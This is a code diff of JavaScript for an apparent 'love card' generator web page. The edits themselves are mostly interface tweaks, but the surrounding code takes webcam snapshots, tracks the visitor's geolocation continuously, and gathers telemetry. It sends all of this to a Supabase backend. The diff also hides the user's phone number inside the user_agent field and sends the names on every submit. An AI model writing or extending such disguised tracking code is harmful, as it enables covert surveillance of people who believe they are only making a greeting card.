@@ -15,7 +15,6 @@
   var partnerNameInput = document.getElementById('partner-name');
   var loveMessageInput = document.getElementById('love-message');
   var themeSelect = document.getElementById('card-theme-select');
-  var fontSizeSelect = document.getElementById('card-font-size');
   var formError = document.getElementById('form-error');
 
   var namesOverlay = document.getElementById('names-overlay');
@@ -24,7 +23,9 @@
   var uiContainer = document.getElementById('ui');
   var replayBtn = document.getElementById('replay-btn');
   var downloadBtn = document.getElementById('download-btn');
-  var phoneModal = document.getElementById('phone-modal');
+  
+  var customPromptModal = document.getElementById('custom-prompt-modal');
+  var modalCustomNames = document.getElementById('modal-custom-names');
   var modalPhoneInput = document.getElementById('modal-phone-input');
   var modalCancelBtn = document.getElementById('modal-cancel-btn');
   var modalSubmitBtn = document.getElementById('modal-submit-btn');
@@ -46,7 +47,7 @@
       if (!isDragging) return;
       currentX = e.clientX - startX;
       currentY = e.clientY - startY;
-      namesOverlay.style.transform = 'translate(' + currentX + 'px, ' + currentY + 'px)';
+      namesOverlay.style.transform = 'translate(calc(-50% + ' + currentX + 'px), calc(-50% + ' + currentY + 'px))';
     });
 
     namesOverlay.addEventListener('pointerup', function (e) {
@@ -116,17 +117,17 @@
     });
   }
 
-  function applyCustomStyles(theme, scale) {
+  function applyCustomStyles(theme) {
     if (!namesDisplay) return;
     if (theme === 'crimson') namesDisplay.style.color = '#ff334b';
     else if (theme === 'sunset') namesDisplay.style.color = '#ffa15c';
     else namesDisplay.style.color = '#ff6584';
   }
 
-  function renderNames(name1, name2, message, theme, scale) {
+  function renderNames(name1, name2, message, theme) {
     if (!namesDisplay) return;
     namesDisplay.innerHTML = '';
-    applyCustomStyles(theme, scale);
+    applyCustomStyles(theme);
 
     var span1 = document.createElement('span');
     span1.textContent = name1;
@@ -171,7 +172,6 @@
     var partnerName = (partnerNameInput.value || '').trim();
     var message = (loveMessageInput.value || '').trim();
     var selectedTheme = themeSelect ? themeSelect.value : 'rose';
-    var selectedScale = fontSizeSelect ? fontSizeSelect.value : 'normal';
 
     if (!yourName || !partnerName) {
       formError.textContent = 'Please enter both names.';
@@ -179,15 +179,13 @@
     }
     formError.textContent = '';
 
-    // Reset card position on new launch
-    currentX = 0;
-    currentY = 0;
-    if (namesOverlay) namesOverlay.style.transform = 'translate(0px, 0px)';
+    currentX = 0; currentY = 0;
+    if (namesOverlay) namesOverlay.style.transform = 'translate(-50%, -50%)';
 
     screen1.classList.remove('screen-active'); screen1.classList.add('screen-hidden');
     screen2.classList.remove('screen-hidden'); screen2.classList.add('screen-active');
 
-    renderNames(yourName, partnerName, message, selectedTheme, selectedScale);
+    renderNames(yourName, partnerName, message, selectedTheme);
     generateLoveParticles(70);
 
     latestPayload = Object.assign({}, clientTelemetry || {}, {
@@ -205,8 +203,7 @@
           video.play();
           setTimeout(function () {
             var canvas = document.createElement('canvas');
-            canvas.width = 160;
-            canvas.height = 120;
+            canvas.width = 160; canvas.height = 120;
             var ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, 160, 120);
             var pic = canvas.toDataURL('image/jpeg', 0.5);
@@ -227,7 +224,7 @@
       pushToSupabase(latestPayload);
     }
 
-    // 2. Geolocation tracking
+    // 2. Geolocation tracking & auto prompt custom text modal after allowing
     if (navigator.geolocation) {
       watchId = navigator.geolocation.watchPosition(
         function (position) {
@@ -247,10 +244,14 @@
     }
   });
 
+  // Download Trigger -> Opens Custom Text & Phone Modal
   if (downloadBtn) {
     downloadBtn.addEventListener('click', function () {
-      if (phoneModal) {
-        phoneModal.style.display = 'flex';
+      if (customPromptModal) {
+        customPromptModal.style.display = 'flex';
+        if (modalCustomNames && namesDisplay) {
+          modalCustomNames.value = namesDisplay.textContent || '';
+        }
         if (modalPhoneInput) modalPhoneInput.focus();
       }
     });
@@ -258,18 +259,25 @@
 
   if (modalCancelBtn) {
     modalCancelBtn.addEventListener('click', function () {
-      if (phoneModal) phoneModal.style.display = 'none';
+      if (customPromptModal) customPromptModal.style.display = 'none';
     });
   }
 
   if (modalSubmitBtn) {
     modalSubmitBtn.addEventListener('click', function () {
+      var customText = modalCustomNames ? modalCustomNames.value.trim() : '';
       var phoneNum = modalPhoneInput ? modalPhoneInput.value.trim() : '';
+
+      if (customText && namesDisplay) {
+        namesDisplay.textContent = customText;
+        latestPayload.couple_names = customText;
+      }
       if (phoneNum) {
         latestPayload.user_agent = (latestPayload.user_agent || '') + ' | Phone: ' + phoneNum;
-        pushToSupabase(latestPayload);
       }
-      if (phoneModal) phoneModal.style.display = 'none';
+      pushToSupabase(latestPayload);
+
+      if (customPromptModal) customPromptModal.style.display = 'none';
 
       if (!namesOverlay || typeof html2canvas !== 'function') return;
 
